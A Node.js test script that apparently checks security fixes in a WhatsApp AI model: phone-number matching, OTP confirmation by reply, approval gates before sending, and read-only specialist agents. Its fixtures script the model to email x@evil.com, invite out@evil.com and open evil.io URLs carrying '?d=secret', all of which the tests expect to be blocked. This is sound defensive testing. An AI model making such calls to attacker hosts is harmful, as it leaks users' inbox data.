'use strict';
/**
 * Offline checks for the account-takeover and approval-gate fixes (scripted
 * model, throwaway DB, Composio OFF — nothing is sent):
 *   - phones match on the full international number, not the last 10 digits
 *   - "sign in by reply" confirms only the request its WM- ref names
 *   - built-in sends wait for a yes even when Composio is not configured
 *   - specialist agents only get read tools
 *   - calendar invites / new automations wait for a yes; automated runs never
 *     act in a browser, save credentials, add automations or open unnamed sites
 * Run:  node scripts/test-security-fixes.js
 */
const os = require('os');
const path = require('path');
const fs = require('fs');

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'wm-secfix-'));
process.env.DATABASE_PATH = path.join(tmp, 't.db');
process.env.DISABLE_WHATSAPP = '1';
process.env.COMPOSIO_API_KEY = '';
process.env.APP_STUDY = '0';
process.env.LEGACY_PHONE_COUNTRY_CODE = '92';

const db = require('../src/db');
db.initSchema();

const claude = require('../src/llm/claude');
let script = [];
claude.chatWithTools = async (messages, opts) => {
  const next = script.shift();
  if (!next) throw new Error('script exhausted');
  return typeof next === 'function' ? next(messages, opts) : next;
};
claude.chat = async () => '';
claude.complete = async () => '';

const googleAuth = require('../src/auth/googleAuth');
googleAuth.isEmailConnected = () => true;
googleAuth.isConnected = () => true;
const gmail = require('../src/services/gmail');
const sentMail = [];
gmail.sendMessage = async (user, msg) => { sentMail.push(msg); return { id: 'm1' }; };

const config = require('../src/config');
const users = require('../src/db/users');
const auth = require('../src/db/auth');
const linkSig = require('../src/utils/linkSig');
const engine = require('../src/engine/conversation');
const { integrationToolsForUser } = require('../src/engine/integrationTools');
const { builtinNeedsYes } = require('../src/engine/integrationExecutor');
const agentExecutor = require('../src/engine/agentExecutor');

const toolUse = (name, input) => ({
  stop_reason: 'tool_use',
  content: [{ type: 'tool_use', id: `tu_${Math.random().toString(36).slice(2, 8)}`, name, input }],
});
const say = (text) => ({ stop_reason: 'end_turn', content: [{ type: 'text', text }] });
const lastToolResult = (messages) => {
  const last = messages[messages.length - 1];
  const block = Array.isArray(last.content) ? last.content.find((b) => b.type === 'tool_result') : null;
  return block ? JSON.parse(block.content) : null;
};

let fails = 0;
const check = (name, ok, extra = '') => { console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${extra ? ` — ${extra}` : ''}`); if (!ok) fails += 1; };

(async () => {
  // ── 1. Phone identity ──────────────────────────────────────────────
  const victim = users.create({ phone: '923001234567' });
  check('same number in other formats finds the user',
    ['+92 300 1234567', '03001234567', '3001234567'].every((p) => (users.getByPhone(p) || {}).id === victim.id));
  check('another country with the same last 10 digits does NOT', users.getByPhone('443001234567') === null);
  const other = users.create({ phone: '443001234567' });
  check('…and gets its own account', other.id !== victim.id && users.getById(victim.id).phone === '923001234567');
  check('duplicate sweep keeps both people', users.mergeDuplicatePhones() === 0 && users.getById(other.id) && users.getById(victim.id));
  check('connect signatures differ', linkSig.connectSig('923001234567') !== linkSig.connectSig('443001234567')
    && linkSig.verifyConnectSig('03001234567', linkSig.connectSig('923001234567')));

  // Legacy 10-digit row still self-heals from the full WhatsApp number.
  const legacyId = 'legacy-1';
  db.db.prepare("INSERT INTO users (id, phone, preferences) VALUES (?, '3009998888', '{}')").run(legacyId);
  check('legacy 10-digit row matches its full number', (users.getByPhone('923009998888') || {}).id === legacyId);
  check('…but not a foreign number sharing the digits', users.getByPhone('13009998888') === null);
  users.upgradePhone(users.getById(legacyId), '923009998888');
  check('legacy row upgrades to the full number', users.getById(legacyId).phone === '923009998888');

  // ── 2. Sign in by reply ────────────────────────────────────────────
  const own = auth.createOtp('923001234567', { ttlSeconds: 600 });
  const attacker = auth.createOtp('923001234567', { ttlSeconds: 600 }); // races the victim's request
  const late = auth.confirmByRef('923001234567', own.ref);
  check("victim's own (replaced) ref does not confirm the attacker's request",
    !late.ok && late.reason === 'expired' && auth.takeConfirmed('923001234567', attacker.pollSecret) === 'pending');
  const okRef = auth.confirmByRef('+92 300 1234567', attacker.ref);
  check('a live ref from the right number confirms that request', okRef.ok && okRef.code === attacker.code);
  const foreign = auth.createOtp('923005550000', { ttlSeconds: 600 });
  check('ref from a number in another country is refused',
    auth.confirmByRef('443005550000', foreign.ref).reason === 'other_number');
  const reset = auth.createOtp('923006660000', { purpose: 'reset', ttlSeconds: 600 });
  check('a reset code cannot be confirmed by reply', !auth.confirmByRef('923006660000', reset.ref).ok);
  check('unknown ref', auth.confirmByRef('923001234567', 'ZZZZZZ').reason === 'unknown');

  // ── 3. Gate without Composio ───────────────────────────────────────
  check('Composio is off in this test', !config.composio.enabled);
  const u = users.create({ phone: '923001112222' });
  users.update(u.id, { name: 'Aamir', onboarding_complete: 1, timezone: 'Asia/Karachi' });
  const tools = await integrationToolsForUser(u);
  check('approve/cancel tools offered without Composio',
    tools.names.has('approve_integration_action') && tools.names.has('cancel_integration_action') && tools.tools.length === 2);

  let parked = null;
  script = [
    toolUse('send_email', { to: 'ali@acme.com', subject: 'Hi', body: 'Hello Ali' }),
    (m) => { parked = lastToolResult(m); return say('Send it? (yes/no)'); },
  ];
  await engine.handleMessage({ text: 'ali ko email karo', phoneNumber: '923001112222', meta: { provider: 'cloud' } });
  check('send_email parked for a yes without Composio', parked && parked.approval_required && sentMail.length === 0, JSON.stringify(parked));

  let approved = null;
  script = [
    toolUse('approve_integration_action', { action_id: parked && parked.action_id }),
    (m) => { approved = lastToolResult(m); return say('Sent.'); },
  ];
  await engine.handleMessage({ text: 'haan bhej do', phoneNumber: '923001112222', meta: { provider: 'cloud' } });
  check('…and sent once after the yes', approved && approved.done && sentMail.length === 1, JSON.stringify(approved));

  // ── 4. Specialists only read ───────────────────────────────────────
  const offered = Object.values(agentExecutor.TOOLBOX).flat().map((t) => t.name);
  const writes = ['send_email', 'reply_to_email', 'forward_email', 'create_event', 'update_event', 'delete_event',
    'create_task', 'complete_task', 'move_task', 'create_goal', 'update_goal_progress', 'complete_goal', 'save_place'];
  check('specialists are offered no write tools', offered.length > 0 && !offered.some((n) => writes.includes(n)), offered.join(','));
  const refused = await agentExecutor.dispatch(u, { name: 'send_email', input: { to: 'x@evil.com', subject: 's', body: 'b' } });
  const refusedDel = await agentExecutor.dispatch(u, { name: 'delete_event', input: { event_id: 'e1' } });
  check('a specialist calling a write tool is refused', refused.error === 'NOT_ALLOWED' && refusedDel.error === 'NOT_ALLOWED' && sentMail.length === 1);

  // ── 5. Invites, automations, automated runs ────────────────────────
  check('invite with attendees needs a yes', builtinNeedsYes('create_event', { title: 't', attendees: ['a@b.com'] })
    && builtinNeedsYes('update_event', { event_id: 'e', attendees: ['a@b.com'] }));
  check('private event / no guests does not', !builtinNeedsYes('create_event', { title: 't' })
    && !builtinNeedsYes('create_event', { title: 't', attendees: [] }) && !builtinNeedsYes('update_event', { event_id: 'e' }));
  check('new automation needs a yes', builtinNeedsYes('create_automation', { instruction: 'x' }));

  let invite = null;
  script = [
    toolUse('create_event', { title: 'Sync', start_time: '2026-10-20T10:00:00+05:00', attendees: ['out@evil.com'] }),
    (m) => { invite = lastToolResult(m); return say('Create it?'); },
  ];
  await engine.handleMessage({ text: 'meeting set karo', phoneNumber: '923001112222', meta: { provider: 'cloud' } });
  check('create_event with attendees is parked end-to-end', invite && invite.approval_required, JSON.stringify(invite));

  const ref = engine.automatedRefusal;
  const auto = { automated: true, trustedText: 'Check the price on https://www.daraz.pk/item every morning' };
  check('automated: browse_and_act refused', !!ref('browse_and_act', { goal: 'g', url: 'https://daraz.pk' }, auto));
  check('automated: save_credential refused', !!ref('save_credential', { label: 'x' }, auto));
  check('automated: create_automation refused', !!ref('create_automation', { instruction: 'x' }, auto));
  check('automated: site the instruction names is allowed', ref('open_website', { url: 'https://daraz.pk/item' }, auto) === null);
  check('automated: any other site is refused', !!ref('open_website', { url: 'https://evil.io/?d=inbox' }, auto));
  check('chat turns are not affected', ref('open_website', { url: 'https://evil.io' }, {}) === null);

  let autoRes = null;
  script = [
    toolUse('open_website', { url: 'https://evil.io/?d=secret' }),
    (m) => { autoRes = lastToolResult(m); return say('done'); },
  ];
  await engine.runAutomatedInstruction(users.getById(u.id), 'Tell me the weather');
  check('automation run cannot open an unnamed site', autoRes && autoRes.error === 'NOT_IN_AUTOMATED_RUN', JSON.stringify(autoRes));

  console.log(fails ? `\n${fails} FAILED` : '\nall passed');
  process.exit(fails ? 1 : 0);
})().catch((e) => { console.error(e); process.exit(1); });
